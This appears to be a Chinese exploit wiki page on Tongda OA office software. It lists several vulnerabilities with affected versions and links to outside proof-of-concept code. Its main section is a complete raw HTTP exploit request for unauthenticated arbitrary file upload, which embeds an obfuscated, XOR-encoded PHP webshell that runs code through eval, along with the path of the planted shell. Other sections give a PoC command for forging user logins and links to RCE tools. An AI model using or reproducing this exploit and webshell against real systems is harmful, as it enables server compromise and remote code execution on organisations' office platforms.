---
title: Tongda-OA(通达)
---

## 应用简介

[通达OA](https://www.tongda2000.com/)，协同办公平台

## 前台任意文件上传

```http
#影响版本
2016-11.6
```

**漏洞利用-EXP**

```http
POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------157569659620694477453109954647
Content-Length: 879
Connection: close
Cookie: PHPSESSID=t0a1f7nd58egc83cnpv045iua4; KEY_RANDOMDATA=16407
Upgrade-Insecure-Requests: 1

-----------------------------157569659620694477453109954647
Content-Disposition: form-data; name="CONFIG[fileFieldName]"

ff
-----------------------------157569659620694477453109954647
Content-Disposition: form-data; name="CONFIG[fileMaxSize]"

1000000000
-----------------------------157569659620694477453109954647
Content-Disposition: form-data; name="CONFIG[filePathFormat]"

Api/conf
-----------------------------157569659620694477453109954647
Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"

.php
-----------------------------157569659620694477453109954647
Content-Disposition: form-data; name="ff"; filename="xxxaaaa.php"
Content-Type: text/plain

<?php
    session_start();
    @set_time_limit(0);
	@error_reporting(0);
    function E($D,$K){
        for($i=0;$i<strlen($D);$i++) {
            $D[$i] = $D[$i]^$K[$i+1&15];
        }
        return $D;
    }
    function Q($D){
        return base64_encode($D);
    }
    function O($D){
        return base64_decode($D);
    }
    $P='PASS_1z';
    $V='payload';
    $T='3c6e0b8a9c15224a';
    if (isset($_POST[$P])){
        $F=O(E(O($_POST[$P]),$T));
        if (isset($_SESSION[$V])){
            $L=$_SESSION[$V];
            $A=explode('|',$L);
            class C{public function nvoke($p) {eval($p."");}}
            $R=new C();
			$R->nvoke($A[0]);
            echo substr(md5($P.$T),0,16);
            echo Q(E(@run($F),$T));
            echo substr(md5($P.$T),16);
        }else{
            $_SESSION[$V]=$F;
        }
    }

-----------------------------157569659620694477453109954647
Content-Disposition: form-data; name="mufile"

提交查询
-----------------------------157569659620694477453109954647--
```

Webshell地址：127.0.0.1/api/conf.php，exp中api/conf表示api为文件上传后的路径，conf为文件名

## [11.5]-前台任意用户伪造登录漏洞

**漏洞概述**

```http
#影响范围
通达OA < 11.5
通达OA = 2017
```

**漏洞利用**

1、使用[POC](https://github.com/NS-Sp4ce/TongDaOA-Fake-User#tongdaoa-fake-user)获取Cookie

```bash
python3 poc.py -v 11 -url http://xxx.com
```

2、浏览器插件`Cookie-Editor`替换Cookie即可登录

**修复建议**

升级到最新版本

**11.5（未授权和SQL注入的POC）**

https://4m.cn/1XlPK

## [11.6]-未授权RCE(危险操作)
**漏洞概述**

```http
#影响范围
V11.6
```

通过任意文件漏洞删除上传点包含的身份验证文件，从而造成未授权访问实现任意文件上传

**漏洞利用**

POC下载：https://github.com/TomAPU/poc_and_exp/blob/master/rce.py

**修复建议**

升级到最新版本

**漏洞分析**

https://xz.aliyun.com/t/8430

## [全版本]-文件上传+文件包含GetShell

**漏洞概述**

```http
#影响范围
V11
2017
2016
2015
2013
2013增强版
```

通过绕过身份认证（或弱口令）, 攻击者可上传任意文件，配合文件包含即可出发远程恶意代码执行

**漏洞利用**

POC：

https://github.com/ghtwf01/td_rce

https://github.com/php00py/tongdaOA

**修复建议**

升级到最新版本

**漏洞分析**

https://xz.aliyun.com/t/7437

## 后台Getshell

🔸 [通达OA 11.2后台getshell](https://www.cnblogs.com/yuzly/p/13606314.html)
🔸 [通达OA 11.7 后台sql注入getshell漏洞](https://www.cnblogs.com/yuzly/p/13690737.html)